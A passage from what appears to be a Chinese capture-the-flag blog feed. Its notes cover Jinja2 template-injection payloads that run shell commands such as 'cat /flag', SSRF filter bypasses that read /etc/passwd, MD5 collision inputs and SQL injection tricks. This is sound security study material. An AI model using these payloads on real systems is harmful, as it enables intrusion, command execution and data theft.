</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">500</span>):  </span><br><span class=\"line\">data = &#123;<span class=\"string\">&quot;code&quot;</span>: <span class=\"string\">&quot;&#123;&#123;().__class__.__base__.__subclasses__()[&quot;</span> + <span class=\"built_in\">str</span>(i) + <span class=\"string\">&quot;].__init__.__globals__&#125;&#125;&quot;</span>&#125; <span class=\"comment\"># 这里的code要根据实际情况填写哦  </span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:  </span><br><span class=\"line\">response = requests.post(url, data=data)  </span><br><span class=\"line\"><span class=\"comment\"># print(response.text)  </span></span><br><span class=\"line\"><span class=\"keyword\">if</span> response.status_code == <span class=\"number\">200</span>:  </span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"string\">&#x27;builtins&#x27;</span> <span class=\"keyword\">in</span> response.text:<span class=\"comment\">#builtins可根据情况设置为&quot;os.py/os&quot;等等  </span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(i)  </span><br><span class=\"line\"><span class=\"keyword\">else</span>:  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;-&#x27;</span>)  </span><br><span class=\"line\"><span class=\"keyword\">except</span>:  </span><br><span class=\"line\"><span class=\"keyword\">pass</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"builtins模板利用\"><a class=\"markdownIt-Anchor\" href=\"#builtins模板利用\">#</a> builtins 模板利用</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[128].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;().__class__.__base__.__subclasses__()[128].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"os模块利用\"><a class=\"markdownIt-Anchor\" href=\"#os模块利用\">#</a> os 模块利用</h4>\n<h5 id=\"1lipsum内置os\"><a class=\"markdownIt-Anchor\" href=\"#1lipsum内置os\">#</a> 1.lipsum 内置 os</h5>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&quot;whoami&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>\n<h5 id=\"2url_for调用os\"><a class=\"markdownIt-Anchor\" href=\"#2url_for调用os\">#</a> 2.url_for 调用 os</h5>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;url_for.__globals__.os.popen(&#x27;whoami&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>\n<h5 id=\"3已加载的os模块的子类里直接调用os模块\"><a class=\"markdownIt-Anchor\" href=\"#3已加载的os模块的子类里直接调用os模块\">#</a> 3. 已加载的 os 模块的子类里直接调用 os 模块</h5>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[457].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;whoami&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>\n<h5 id=\"4第三方库使用load_module加载os\"><a class=\"markdownIt-Anchor\" href=\"#4第三方库使用load_module加载os\">#</a> 4. 第三方库，使用 load_module 加载 os</h5>\n<p>python 脚本找_frozen_importlib.BuiltinImporter</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;[].__class__.__base__.__subclasses__()[69][&quot;load_module&quot;](&quot;os&quot;)[&quot;popen&quot;](&quot;whoami&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"linecache函数\"><a class=\"markdownIt-Anchor\" href=\"#linecache函数\">#</a> linecache 函数</h4>\n<p>这个本来是读取任意一个文件某一行的，而这个函数也引入 os 模板，利用方法同 4, 先找 linecache 模块位置，再用 [‘linecache’][‘os’]</p>\n<h5 id=\"subprocesspopen类\"><a class=\"markdownIt-Anchor\" href=\"#subprocesspopen类\">#</a> subprocess.Popen 类</h5>\n<p>脚本找类位置，假设是 496<br>\n 利用方法:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[496](&#x27;whoami&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"jinjia格式\"><a class=\"markdownIt-Anchor\" href=\"#jinjia格式\">#</a> jinjia 格式</h3>\n<p><code>控制结构&#123;% %&#125;</code> <br>\n <code>变量取值&#123;&#123; &#125;&#125;</code> <br>\n <code>注释</code></p>\n<h3 id=\"了解python的几个函数解析\"><a class=\"markdownIt-Anchor\" href=\"#了解python的几个函数解析\">#</a> 了解 python 的几个函数解析</h3>\n<p><em>class</em> 返回调用的参数类型<br>\n<em> bases</em> 返回基类列表<br>\n<em> mro</em> 返回所有子类元组，最后一个一般是 object<br>\n<em>subclasses</em> () 返回 object 的子类<br>\n<em> globals</em> 函数会以字典类型返回当前位置的全部全局变量<br>\n<em> init</em> 检查这个类是否被重载过，一般没有，没有就能利用，没带 wapper 字段就是没有<br>\n<strong> dic</strong> 保存类实例或对象实例的属性变量键值对字典<br>\n<strong> builtins</strong> 内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数<br>\n url_for flask 的一个方法，可以用于得到__builtins__，而且 url_for.<strong>globals</strong>[‘<strong>builtins</strong>’] 含有 current_app。<br>\nget_flashed_messages flask 的一个方法，可以用于得到__builtins__<br>\nos.popen () 方法用于从一个命令打开一个管道。</p>\n<h2 id=\"常见payload\"><a class=\"markdownIt-Anchor\" href=\"#常见payload\">#</a> 常见 payload</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[185].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/&#123;&#123; config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read() &#125;&#125;`</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config.FLAG&#125;&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;get_flashed_messages.__globals__[&#x27;current_app&#x27;].config.FLAG&#125;&#125;</span><br></pre></td></tr></table></figure>\n<p><code>&#123;&#123;''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].listdir('.')&#125;&#125;</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;&lt;command&gt;&#x27;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;lipsum.__globals__.__getitem__(&quot;os&quot;).popen(&quot;cat flag&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">`&#123;&#123;a.__init__.__globals__.__builtins__.eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;)&#125;&#125;`</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% for i in &#x27;&#x27;.__class__.__base__.__subclasses__() %&#125;&#123;% if i.__name__==&#x27;Popen&#x27; %&#125;&#123;&#123; i.__init__.__globals__.__getitem__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>\n<p>参考:<br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vdnVscy8zNDc4NjUuaHRtbA==\">PYTHON SSTI 的一些 BYPASS - FreeBuf 网络安全行业门户</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzMyODIyMi5odG1s\"> CTF 对 SSTI 的一些总结 - FreeBuf 网络安全行业门户</span></p>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/04/30/SSRF/",
            "url": "https://hq185187.github.io/2023/04/30/SSRF/",
            "title": "SSRF绕过",
            "date_published": "2023-04-30T15:53:24.221Z",
            "content_html": "<h3 id=\"协议\"><a class=\"markdownIt-Anchor\" href=\"#协议\">#</a> 协议:</h3>\n<p>1.file 协议</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">file:///etc/passwd</span><br><span class=\"line\">file:///C:/Users/30779/Documents/password.txt</span><br></pre></td></tr></table></figure>\n<p>2.dict: 字典服务器协议，能访问更多字典源</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?url=dict://主机/info</span><br><span class=\"line\">可以获取目标服务器上运行的服务版本信息</span><br></pre></td></tr></table></figure>\n<p>3.gopher 协议：分布式的文档传递服务</p>\n<h3 id=\"绕过\"><a class=\"markdownIt-Anchor\" href=\"#绕过\">#</a> 绕过</h3>\n<h4 id=\"1ip的限制\"><a class=\"markdownIt-Anchor\" href=\"#1ip的限制\">#</a> 1.IP 的限制</h4>\n<p>(1)enclosed alphanumerics<br>\n① ② ⑦.⓿.⓿.①<br>\n(2) 短网址 (网址缩短)<br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzZkdS5pbi8=\">http://6du.in/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudXJsYy5jbi8=\">https://www.urlc.cn/</span><br>\n(3) 句号代替点<br>\n 127。0。0。1<br>\n (4) 编码绕过<br>\n 127.0.0.1<br>\n 十六进制：7F000001    前面加 0x<br>\n 十进制：2130706433<br>\n 八进制：17700000001     前加 0, 可以加多个<br>\n (5) 省略绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Windows下0代表0.0.0.0</span><br><span class=\"line\">Linux下代表127.0.0.1</span><br><span class=\"line\">http://0代替127.0.0.1:</span><br><span class=\"line\">ping 0 -c 4</span><br><span class=\"line\">127.0.0.1之间的0也可以省路:</span><br><span class=\"line\">ping 127.1 -c 4</span><br></pre></td></tr></table></figure>\n<p>(6) 302 跳转</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">if(isset($_GET[&#x27;url&#x27;]))&#123;</span><br><span class=\"line\">    header(&quot;Location: &#123;$_GET[&#x27;url&#x27;]&#125;&quot;);</span><br><span class=\"line\">    exit;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>(7).@绕过<br>\n访问 <code>http://www.baidu.com@10.10.10.10</code>  与 <code>http://10.10.10.10</code>  请求是相同的<br>\n (8) 配置域名<br>\n加速我们手中有可控域名，可以将域名 A 记录指向想要请求的 IP 进行绕过<br>\n<span class=\"exturl\" data-url=\"aHR0cDovL2V2aWwuZXhhbXBsZS5jb20=\"> evil.example.com</span> =&gt; 10.0.18.3</p>\n<p><mark>注意:php 的 url 解析:</mark></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://a@127.0.0.1:80@baidu.com</span><br></pre></td></tr></table></figure>\n<p>可以实现检测 IP 时是正常的一个网站域名，而实际 curl 的是 127.0.0.1:80, 从而实现 ssrf</p>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/04/30/md5/",
            "url": "https://hq185187.github.io/2023/04/30/md5/",
            "title": "MD5绕过总结",
            "date_published": "2023-04-29T16:53:12.476Z",
            "content_html": "<h3 id=\"md5\"><a class=\"markdownIt-Anchor\" href=\"#md5\">#</a> md5</h3>\n<h4 id=\"1md5弱类型比较\"><a class=\"markdownIt-Anchor\" href=\"#1md5弱类型比较\">#</a> 1.md5 弱类型比较</h4>\n<p>(1) 0e 绕过<br>\n一些常见的 md 加密后还是 0e 开头的</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">byGcY</span><br><span class=\"line\">0e591948146966052067035298880982</span><br><span class=\"line\"></span><br><span class=\"line\">QNKCDZO</span><br><span class=\"line\">0e830400451993494058024219903391</span><br><span class=\"line\"></span><br><span class=\"line\">s878926199a</span><br><span class=\"line\">0e545993274517709034328855841020</span><br><span class=\"line\"></span><br><span class=\"line\">s155964671a</span><br><span class=\"line\">0e342768416822451524974117254469</span><br><span class=\"line\"></span><br><span class=\"line\">s214587387a</span><br><span class=\"line\">0e848240448830537924465865611904</span><br><span class=\"line\"></span><br><span class=\"line\">s214587387a</span><br><span class=\"line\">0e848240448830537924465865611904</span><br><span class=\"line\"></span><br><span class=\"line\">s878926199a</span><br><span class=\"line\">0e545993274517709034328855841020</span><br><span class=\"line\"></span><br><span class=\"line\">s1091221200a</span><br><span class=\"line\">0e940624217856561557816327384675</span><br><span class=\"line\"></span><br><span class=\"line\">s1885207154a</span><br><span class=\"line\">0e509367213418206700842008763514</span><br><span class=\"line\"></span><br><span class=\"line\">240610708</span><br><span class=\"line\">0e462097431906509019562988736854</span><br><span class=\"line\"></span><br><span class=\"line\">314282422</span><br><span class=\"line\">0e990995504821699494520356953734</span><br><span class=\"line\"></span><br><span class=\"line\">571579406</span><br><span class=\"line\">0e972379832854295224118025748221</span><br><span class=\"line\"></span><br><span class=\"line\">903251147</span><br><span class=\"line\">0e174510503823932942361353209384</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>(2) 数组绕过</p>\n<ol>\n<li>由于 md5 不能加密数组，在加密数组的时候会返回 NUL</li>\n<li>eg.``?param1[]=1&amp;param2[]=2</li>\n</ol>\n<h4 id=\"2双md5判断\"><a class=\"markdownIt-Anchor\" href=\"#2双md5判断\">#</a> 2. 双 md5 判断</h4>\n<p>有些题目可能需要经过两次 md5 加密判断，一些两次 md5 加密后 0e 开头的:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CbDLytmyGm2xQyaLNhWn 770hQgrBOjrcqftrlaZk 7r4lGXCH2Ksu2JNT3BYM</span><br></pre></td></tr></table></figure>\n<h4 id=\"3md5强类型比较\"><a class=\"markdownIt-Anchor\" href=\"#3md5强类型比较\">#</a> 3.md5 强类型比较</h4>\n<p>(1) 数组绕过<br>\n (2) 使用加密后两个完全相等的两个字符串绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">二进制md5加密 ecd33e3e09ff2a58e1d9ed7189dc186b</span><br><span class=\"line\">url编码 </span><br><span class=\"line\">第一个参数:</span><br><span class=\"line\">abc%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%D6%16y%AC%CE%C5%A1LrY5fn%94%10%D9%01%C3%AC%F8%AAN%21%D0%27%BE%3Ej%A7%22%0C%D08%D3%AF%DFRo%2F%A4%8B%E8%EB45j%E4h%9C%21%22%AB%7E%BC%8E%7C%17%9E%C3Xg%D7%A8%CDHt%BE%AB.%2FWb%3Eb%EA%FC%261%0F_%3D%AFo%3F%1E%DE%E8i%86%7D%BF%C7_Q%CDA%B4%CF%B8n%06Ir%7F%5C%A3k%F9%2AO%DFF%2A%F3%8BcH%FF%85%3F%0D%D0%9B%C7%C8-%12%92</span><br><span class=\"line\"></span><br><span class=\"line\">第二个参数:</span><br><span class=\"line\">url编码 abc%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%D6%16y%AC%CE%C5%A1LrY5fn%94%10%D9%01%C3%ACx%AAN%21%D0%27%BE%3Ej%A7%22%0C%D08%D3%AF%DFRo%2F%A4%8B%E8%EB45%EA%E4h%9C%21%22%AB%7E%BC%8E%7C%17%9E%C3%D8g%D7%A8%CDHt%BE%AB.%2FWb%3Eb%EA%FC%261%0F_%3D%AFo%BF%1E%DE%E8i%86%7D%BF%C7_Q%CDA%B4%CF%B8n%06Ir%7F%5C%A3k%F9%2A%CF%DEF%2A%F3%8BcH%FF%85%3F%0D%D0%9BG%C8-%12%92</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>传参:a = 参数 1&amp;b = 参数 2<mark> 注意中间不能有换行空格</mark></p>\n<p>== 为什么要 url 编码？== 有不可见字符<br>\n再给一个 payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">array1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;array2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span><br></pre></td></tr></table></figure>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/04/29/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E7%BB%95%E8%BF%87/",
            "url": "https://hq185187.github.io/2023/04/29/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E7%BB%95%E8%BF%87/",
            "title": "SQL注入绕过",
            "date_published": "2023-04-28T17:31:47.527Z",
            "content_html": "<h1 id=\"一字符替换\"><a class=\"markdownIt-Anchor\" href=\"#一字符替换\">#</a> 一。字符替换</h1>\n<h3 id=\"1过滤空格\"><a class=\"markdownIt-Anchor\" href=\"#1过滤空格\">#</a> 1. 过滤空格</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">%0a,%0b,%0c,%0d,%09,%a0(只在特定字符集才能利用),/**/,括号等</span><br></pre></td></tr></table></figure>\n<h3 id=\"2select替换成空\"><a class=\"markdownIt-Anchor\" href=\"#2select替换成空\">#</a> 2.select 替换成空</h3>\n<p>双写 selectselect</p>\n<h3 id=\"3大小写绕过\"><a class=\"markdownIt-Anchor\" href=\"#3大小写绕过\">#</a> 3. 大小写绕过</h3>\n<p>MySQL 中是不区分大小写的，若是过滤了 SELECT, 就用 select 绕过，其他同理</p>\n<h3 id=\"4正则匹配\"><a class=\"markdownIt-Anchor\" href=\"#4正则匹配\">#</a> 4. 正则匹配</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">正则匹配\\bselect\\b可以用形如/*!50000*/方法绕过</span><br><span class=\"line\">/*!50000*/是一种特殊的注释,里面的SQL会被执行,50000是一个版本号,假设MySQL版本大于这个版本号就执行里面的SQL语句</span><br></pre></td></tr></table></figure>\n<h3 id=\"5替换了单引号或双引号忘记了反斜杠\"><a class=\"markdownIt-Anchor\" href=\"#5替换了单引号或双引号忘记了反斜杠\">#</a> 5. 替换了单引号或双引号，忘记了反斜杠</h3>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$sql</span>=<span class=\"string\">&quot;SELECT * FROM wp_news WHERE id=&#x27;可控点1&#x27; AND title=&#x27;可控点2&#x27;&quot;</span></span><br></pre></td></tr></table></figure>\n<p>绕过</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$sql</span>=<span class=\"string\">&quot;SELECT * FROM wp_news WHERE id=&#x27;a\\&#x27; AND title=&#x27;OR sleep(1)#&#x27;&quot;</span></span><br></pre></td></tr></table></figure>\n<p>第一个可控点的反斜杠转义可控点 1 预置的单引号，导致可控点 2 逃逸出单引号<br>\n eg</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> websites <span class=\"keyword\">where</span> id<span class=\"operator\">=</span><span class=\"string\">&#x27;a\\&#x27;</span> <span class=\"keyword\">and</span> url<span class=\"operator\">=</span><span class=\"string\">&#x27;union select 1,2,(select concat(id,0x7e,url)from websites limit 1)#&#x27;</span>;</span><br></pre></td></tr></table></figure>\n<h3 id=\"二逃逸引号\"><a class=\"markdownIt-Anchor\" href=\"#二逃逸引号\">#</a> 二。逃逸引号</h3>\n<p>注入的重点是逃逸引号，但开发者往往会做一次 addslashes (转义单双引号，反斜杠), 怎么绕过</p>\n<h3 id=\"1编码解码\"><a class=\"markdownIt-Anchor\" href=\"#1编码解码\">#</a> 1. 编码解码</h3>\n<p>宽字节注入，稍后说</p>\n<h3 id=\"2意料之外的注入点\"><a class=\"markdownIt-Anchor\" href=\"#2意料之外的注入点\">#</a> 2. 意料之外的注入点</h3>\n<p>开发者在转义用户输入时遗漏了一些可注入点.PHP: 文件的上传名，http header,$SERVER [‘PHP_SELF’] 这些变量，稍后举例</p>\n<h3 id=\"3二次注入\"><a class=\"markdownIt-Anchor\" href=\"#3二次注入\">#</a> 3. 二次注入</h3>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">id</th>\n<th style=\"text-align:center\">username</th>\n<th style=\"text-align:center\">password</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">1</td>\n<td style=\"text-align:center\">admin</td>\n<td style=\"text-align:center\">password</td>\n</tr>\n</tbody>\n</table>\n<p>假设一个表如上图，用户输入:</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">insert</span> <span class=\"keyword\">into</span> wp_user <span class=\"keyword\">values</span>(<span class=\"number\">2</span>,<span class=\"string\">&#x27;admin\\&#x27;</span><span class=\"keyword\">or</span>\\<span class=\"string\">&#x27;1&#x27;</span>,<span class=\"string\">&#x27;some pass&#x27;</span>);</span><br></pre></td></tr></table></figure>\n<p>此时库的内容是:</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">id</th>\n<th style=\"text-align:center\">username</th>\n<th style=\"text-align:center\">password</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">2</td>\n<td style=\"text-align:center\">admin’or’1</td>\n<td style=\"text-align:center\">somepass</td>\n</tr>\n</tbody>\n</table>\n<p>引号被转义，正常入库，但是当这个用户名被再次使用时</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$res</span>=<span class=\"title function_ invoke__\">mysqli_query</span>(<span class=\"variable\">$conn</span>,<span class=\"string\">&quot;SELECT password from wp_user where username=&#x27;<span class=\"subst\">$name</span>&#x27;&quot;</span>);</span><br></pre></td></tr></table></figure>\n<p>此时 SQL 语句为</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> password <span class=\"keyword\">from</span> wp_user <span class=\"keyword\">where</span> username<span class=\"operator\">=</span><span class=\"string\">&#x27;admin&#x27;</span><span class=\"keyword\">or</span><span class=\"string\">&#x27;1&#x27;</span>;</span><br></pre></td></tr></table></figure>\n<p>此时产生注入</p>\n<h3 id=\"4字符串截断\"><a class=\"markdownIt-Anchor\" href=\"#4字符串截断\">#</a> 4. 字符串截断</h3>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$title</span>=<span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;title&#x27;</span>]);</span><br><span class=\"line\"><span class=\"variable\">$title</span>=<span class=\"title function_ invoke__\">substr</span>(<span class=\"variable\">$title</span>,<span class=\"number\">0</span>,<span class=\"number\">10</span>);</span><br><span class=\"line\"><span class=\"variable\">$content</span>=<span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;content&#x27;</span>]);</span><br><span class=\"line\"><span class=\"variable\">$sql</span>=<span class=\"string\">&quot;INSERT INTO wp_news VALUES(2,&#x27;<span class=\"subst\">$title</span>&#x27;,&#x27;<span class=\"subst\">$content</span>&#x27;)&quot;</span>;</span><br></pre></td></tr></table></figure>\n<p>假如输入 